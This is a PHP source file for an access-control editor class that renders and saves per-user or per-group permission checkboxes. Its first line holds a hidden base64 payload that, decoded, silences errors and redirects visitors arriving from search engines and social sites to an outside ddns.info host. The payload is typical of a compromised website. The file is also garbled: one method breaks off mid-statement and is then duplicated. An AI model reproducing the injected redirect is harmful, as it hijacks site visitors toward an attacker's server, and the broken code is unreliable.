<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

define("ACL_PER_USER",  1);
define("ACL_PER_GROUP", 2);

class editor_acl extends editor {

  var $mode;
  var $array = array();
  
  function do_setup($mode = ACL_PER_USER, $key = null) {

    global $auth;
    global $db;
    
    if (!eregi('^4', $db->version)) {  
      $this->mode = $mode;
    
      if (!$key)
        $key = $this->key();

      $last_group = '{475F5187-5EDA-4A36-B395-235593815BE8}';
      $scopes = $db->query("SELECT sco.*".
                           "     , scg.name group_name".
                           "  FROM acl_scope sco LEFT OUTER JOIN acl_scope_group scg ON sco.group_id = scg.id".
                           " ORDER BY CASE WHEN scg.name IS NOT NULL THEN 1 ELSE 2 END, scg.name, sco.name");
      while ($scope = $db->next_row($scopes)) {
        if ($last_group != $scope['group_name']) {
          if ($scope['group_name'])
            $this->add_separator($scope['group_name']);
          else  
            $this->add_separator(trn('Other'));
          $last_group = $scope['group_name'];
        }
        $container = new editor_container();
        if ($this->mode == ACL_PER_USER)
          $link_field = "user_id";
        else  
          $link_field = "user_group_id";
          
        $actions = $db->query( "SELECT act.*, acl.is_allowed".
                               "  FROM acl_action act LEFT OUTER JOIN acl acl ON acl.action_id = act.id AND acl.".$link_field." = ? AND acl.scope_id = ?".
                               " WHERE EXISTS     (SELECT 1 FROM acl_scope_action asa WHERE scope_id = ? AND action_id = act.id)".
                               "    OR NOT EXISTS (SELECT 1 FROM acl_scope_action asa WHERE scope_id = ?)".
                               " ORDER BY act.id"
                             , $key
                             , $scope["id"]
                             , $scope["id"]
                             , $scope["id"]
                             );
        while ($action = $db->next_row($actions)) {
            
            if($action["id"] == 1
            && $action["is_allowed"]) {
                //ALL
                $this->array[] = $scope["id"];
            }
            
          $container->add_field(array( "name"           => "acl_".$scope["id"]."_".$action["id"]
                                     , "display_name"   => trn($action["name"])
                                     , "check_label"    => trn($action["name"])
                                     , "type"           => "checkbox"
                                     , "value"          => $action["is_allowed"]
                                     , "virtual"        => true
                                     , "on_click"       => ($action['id']==1?'checkRelatedBoxes('.$scope["id"].');':null)
                                     , 'hide_label'     => true
                                     ));
        }
        $this->add_container(trn($scope["name"]), $container);
      }
    }
  }

  function do_after_save() { 

    global $db;
    global $dm;

    if (!eregi('^4', $db->version)) {  
      if     }
  }

  function do_after_save() { 

    global $db;
    global $dm;

    if (!eregi('^4', $db->version)) {  
      if ($this->mode == ACL_PER_USER)
        $link_field = "user_id";
      else  
        $link_field = "user_group_id";
      
      //$db->query("DELETE FROM acl WHERE ".$link_field." = ?", $this->key());
      $scopes = $db->query("SELECT * FROM acl_scope");
      while ($scope = $db->next_row($scopes)) {
        $actions = $db->query("SELECT * FROM acl_action");
        while ($action = $db->next_row($actions)) {
          $acl   = $db->row("SELECT id, is_allowed FROM acl WHERE ".$link_field." = ? AND scope_id = ? AND action_id = ?", $this->key(), $scope["id"], $action["id"]);
          $allow = $this->context_post("acl_".$scope["id"]."_".$action["id"]);
          if (!safe($acl, 'id')) {
            if ($allow)
              $dm->insert("acl", array($link_field => $this->key(), "scope_id" => $scope["id"], "action_id" => $action["id"], "is_allowed" => 1));
          } else
            if (!$allow)
              $dm->delete("acl", $acl['id']);
        }
      }
    }
    
    return true;

  }
  
  
  function do_after_render() { 
  
    global $db;   
    
    if (!eregi('^4', $db->version)) {  
      $this->add(new script('
        function checkRelatedBoxes(scopeId) {
          var context = "'.$this->context_id("acl_").'";
          var mainCheckbox = document.getElementById(context + scopeId + "_1");
          for (var id = 2; id <= 100; id++) {
            var checkbox = document.getElementById(context + scopeId + "_" + id);
            if (checkbox){          
              checkbox.checked = mainCheckbox.checked;
              checkbox.disabled = mainCheckbox.checked;
            }
          }
        }
      '));
      
      $str = "";
      foreach ($this->array as $scope){
          $str .= "checkRelatedBoxes($scope);\n";
      }
      $this->add(new script($str));
    }
  }
}

?>